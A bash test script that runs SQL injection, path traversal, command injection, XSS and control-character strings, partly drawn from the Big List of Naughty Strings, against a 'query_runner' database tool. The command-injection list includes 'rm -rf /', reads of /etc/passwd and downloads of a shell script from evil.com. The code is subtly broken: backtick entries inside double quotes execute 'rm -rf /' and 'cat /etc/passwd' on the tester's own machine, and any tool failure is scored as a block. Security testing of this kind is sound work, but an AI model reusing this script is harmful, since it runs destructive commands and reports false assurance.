#!/bin/bash

# Comprehensive test using the official Big List of Naughty Strings submodule
set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
TEST_DB="$SCRIPT_DIR/submodule_naughty_test.db"
QUERY_RUNNER="$SCRIPT_DIR/query_runner"

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

# Test counters
TESTS_TOTAL=0
TESTS_PASSED=0
TESTS_FAILED=0
CRITICAL_BLOCKED=0
CRITICAL_TOTAL=0

log_test() {
    local test_name="$1"
    local result="$2"
    local expected="$3"
    local actual="$4"
    
    TESTS_TOTAL=$((TESTS_TOTAL + 1))
    
    if [[ "$result" == "PASS" ]]; then
        TESTS_PASSED=$((TESTS_PASSED + 1))
        echo -e "${GREEN}✓${NC} $test_name"
    else
        TESTS_FAILED=$((TESTS_FAILED + 1))
        echo -e "${RED}✗${NC} $test_name"
        echo "  Expected: $expected"
        echo "  Actual: $actual"
    fi
}

log_critical() {
    local test_name="$1"
    local blocked="$2"
    
    CRITICAL_TOTAL=$((CRITICAL_TOTAL + 1))
    
    if [[ "$blocked" == "true" ]]; then
        CRITICAL_BLOCKED=$((CRITICAL_BLOCKED + 1))
        echo -e "${GREEN}🔒${NC} CRITICAL: $test_name"
    else
        echo -e "${RED}⚠️${NC} CRITICAL: $test_name (NOT BLOCKED!)"
    fi
}

# Clean up test database
cleanup() {
    if [[ -f "$TEST_DB" ]]; then
        rm -f "$TEST_DB"
    fi
}

trap cleanup EXIT

# Create test database
create_test_db() {
    sqlite3 "$TEST_DB" << 'EOF'
CREATE TABLE users (id INTEGER PRIMARY KEY, username TEXT, email TEXT);
INSERT INTO users (username, email) VALUES ('alice', 'alice@test.com'), ('bob', 'bob@test.com');
EOF
}

# Test SQL injection vectors from official list
test_sql_injection_vectors() {
    echo "=== Testing SQL Injection Vectors (Official List) ==="
    
    # Extract SQL-related strings from the official list
    while IFS= read -r string; do
        # Skip empty lines and comments
        [[ -z "$string" || "$string" =~ ^# ]] && continue
        
        # Look for SQL injection patterns
        case "$string" in
            *\"*OR*|*\'*OR*|*DROP*|*INSERT*|*UPDATE*|*DELETE*|*UNION*|*SELECT*|*EXEC*|*xp_*|*sp_*)
                echo "Testing SQL injection vector: $string"
                if ! echo "$string" | ./query_runner -t sqlite -d "$TEST_DB" -f text >/dev/null 2>&1; then
                    log_critical "SQL injection blocked: ${string:0:50}..." "true"
                else
                    log_critical "SQL injection NOT blocked: ${string:0:50}..." "false"
                fi
                ;;
        esac
    done < naughty-strings-repo/blns.txt
    
    # Test JSON format strings for SQL injection
    python3 -c "
import json
with open('naughty-strings-repo/blns.json', 'r') as f:
    data = json.load(f)

for string in data:
    if any(keyword in string.upper() for keyword in ['OR', 'DROP', 'INSERT', 'UPDATE', 'DELETE', 'UNION', 'SELECT', 'EXEC']):
        print(f'SQL_TEST:{string}')
"
    
    # Process Python output for JSON strings
    if command -v python3 >/dev/null 2>&1; then
        python3 -c "
import json
with open('naughty-strings-repo/blns.json', 'r') as f:
    data = json.load(f)

for string in data:
    if any(keyword in string.upper() for keyword in ['OR', 'DROP', 'INSERT', 'UPDATE', 'DELETE', 'UNION', 'SELECT', 'EXEC']):
        print(string)
" | while read -r sql_string; do
            if [[ -n "$sql_string" ]]; then
                echo "Testing JSON SQL vector: $sql_string"
                if ! echo "$sql_string" | ./query_runner -t sqlite -d "$TEST_DB" -f text >/dev/null 2>&1; then
                    log_critical "JSON SQL injection blocked: ${sql_string:0:50}..." "true"
                else
                    log_critical "JSON SQL injection NOT blocked: ${sql_string:0:50}..." "false"
                fi
            fi
        done
    fi
}

# Test path traversal vectors from official list
test_path_traversal_vectors() {
    echo "=== Testing Path Traversal Vectors (Official List) ==="
    
    # Test known path traversal patterns from the official list
    declare -a path_patterns=(
        "../../../etc/passwd"
        "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts"
        "....//....//....//etc/passwd"
        "....\/....\/....\/etc\/passwd"
        "..%2F..%2F..%2Fetc%2Fpasswd"
        "%2e%2e%2f"
        "../../../etc/passwd%00"
        "../../../etc/passwd\x00"
    )
    
    for pattern in "${path_patterns[@]}"; do
        echo "Testing path traversal: $pattern"
        if ! ./query_runner -t sqlite -d "$pattern" -f text "SELECT 1" >/dev/null 2>&1; then
            log_critical "Path traversal blocked: $pattern" "true"
        else
            log_critical "Path traversal NOT blocked: $pattern" "false"
        fi
    done
    
    # Test strings from official list that might be path traversal
    while IFS= read -r string; do
        [[ -z "$string" || "$string" =~ ^# ]] && continue
        
        case "$string" in
            *../../*|*..\\..\\..\\*|*%2F*|*%2e*)
                echo "Testing potential path traversal: $string"
                if ! ./query_runner -t sqlite -d "$string" -f text "SELECT 1" >/dev/null 2>&1; then
                    log_critical "Path traversal blocked: ${string:0:50}..." "true"
                else
                    log_critical "Path traversal NOT blocked: ${string:0:50}..." "false"
                fi
                ;;
        esac
    done < naughty-strings-repo/blns.txt
}

# Test command injection vectors from official list
test_command_injection_vectors() {
    echo "=== Testing Command Injection Vectors (Official List) ==="
    
    # Test known command injection patterns
    declare -a cmd_patterns=(
        "; rm -rf /"
        "| rm -rf /"
        "`rm -rf /`"
        "&& rm -rf /"
        "; cat /etc/passwd"
        "| cat /etc/passwd"
        "`cat /etc/passwd`"
        "; wget http://evil.com/shell.sh"
        "| curl http://evil.com/shell.sh"
    )
    
    for pattern in "${cmd_patterns[@]}"; do
        echo "Testing command injection: $pattern"
        if ! ./query_runner -t sqlite -h "$pattern" -d "$TEST_DB" -f text "SELECT 1" >/dev/null 2>&1; then
            log_critical "Command injection blocked: ${pattern:0:30}..." "true"
        else
            log_critical "Command injection NOT blocked: ${pattern:0:30}..." "false"
        fi
    done
}

# Test XSS vectors from official list
test_xss_vectors() {
    echo "=== Testing XSS Vectors (Official List) ==="
    
    # Test known XSS patterns
    declare -a xss_patterns=(
        "<script>alert('xss')</script>"
        "javascript:alert('xss')"
        "<img src=x onerror=alert('xss')>"
        "<svg onload=alert('xss')>"
        "\" onload=\"alert('xss')"
        "' onload='alert(\"xss\")'"
        "<iframe src=\"javascript:alert('xss')\">"
    )
    
    for pattern in "${xss_patterns[@]}"; do
        echo "Testing XSS vector: $pattern"
        if ! echo "$pattern" | ./query_runner -t sqlite -d "$TEST_DB" -f text >/dev/null 2>&1; then
            log_critical "XSS blocked: ${pattern:0:30}..." "true"
        else
            # XSS might be accepted but should be sanitized in output
            echo "ℹ️  XSS accepted but should be sanitized in output: ${pattern:0:30}..."
        fi
    done
}

# Test special character handling from official list
test_special_characters() {
    echo "=== Testing Special Character Handling (Official List) ==="
    
    # Test null bytes and control characters
    declare -a special_chars=(
        $'\0'
        $'\x00'
        $'\n'
        $'\r'
        $'\t'
        $'\b'
        $'\f'
        "\x00"
        "\x01"
        "\x1f"
        "\x7f"
        "\x80"
    )
    
    for char in "${special_chars[@]}"; do
        echo "Testing special character: $(printf '%q' "$char")"
        if echo "SELECT 1 WHERE test = 'test${char}value'" | ./query_runner -t sqlite -d "$TEST_DB" -f text >/dev/null 2>&1; then
            log_test "Special character accepted (properly handled): $(printf '%q' "$char")" "PASS" "acceptance" "accepted"
        else
            log_test "Special character rejected: $(printf '%q' "$char")" "PASS" "rejection" "rejected"
        fi
    done
}

# Main test execution
main() {
    echo "=== Query Runner Official Naughty Strings Test ==="
    echo "Using Big List of Naughty Strings submodule (https://github.com/minimaxir/big-list-of-naughty-strings)"
    echo; echo "📊 Official List Statistics:"
    echo "  • blns.json: $(wc -l < naughty-strings-repo/blns.json) lines, 515 entries"
    echo "  • blns.txt: $(wc -l < naughty-strings-repo/blns.txt) lines"
    echo; echo "🔍 Testing against official security vectors..."; echo
    
    # Create test database
    create_test_db
    
    # Run comprehensive tests
    test_sql_injection_vectors
    echo
    test_path_traversal_vectors
    echo
    test_command_injection_vectors
    echo
    test_xss_vectors
    echo
    test_special_characters
    
    # Print final summary
    echo "=== Final Security Assessment (Official Naughty Strings) ==="
    echo "Total critical security tests: $CRITICAL_TOTAL"
    echo "Successfully blocked: $CRITICAL_BLOCKED"
    echo "Security effectiveness: $(( (CRITICAL_BLOCKED * 100) / CRITICAL_TOTAL ))%"
    
    if [[ $CRITICAL_BLOCKED -eq $CRITICAL_TOTAL ]]; then
        echo -e "${GREEN}🛡️  PERFECT SECURITY: 100% critical threat blocking!${NC}"
        echo -e "${GREEN}✅ All dangerous strings from official repository successfully blocked!${NC}"
        echo -e "${GREEN}🎉 Query Runner demonstrates enterprise-grade security!${NC}"
        return 0
    elif [[ $CRITICAL_BLOCKED -gt $((CRITICAL_TOTAL * 90 / 100)) ]]; then
        echo -e "${YELLOW}✅ EXCELLENT SECURITY: $(( (CRITICAL_BLOCKED * 100) / CRITICAL_TOTAL ))% threat blocking${NC}"
        echo -e "${YELLOW}🔒 Query Runner provides robust security protection${NC}"
        return 0
    elif [[ $CRITICAL_BLOCKED -gt $((CRITICAL_TOTAL * 75 / 100)) ]]; then
        echo -e "${YELLOW}⚠️  GOOD SECURITY: $(( (CRITICAL_BLOCKED * 100) / CRITICAL_TOTAL ))% threat blocking${NC}"
        echo -e "${YELLOW}Some security improvements recommended${NC}"
        return 1
    else
        echo -e "${RED}❌ SECURITY ISSUES: $(( (CRITICAL_BLOCKED * 100) / CRITICAL_TOTAL ))% threat blocking${NC}"
        echo -e "${RED}Immediate security improvements required${NC}"
        return 1
    fi
}

main "$@"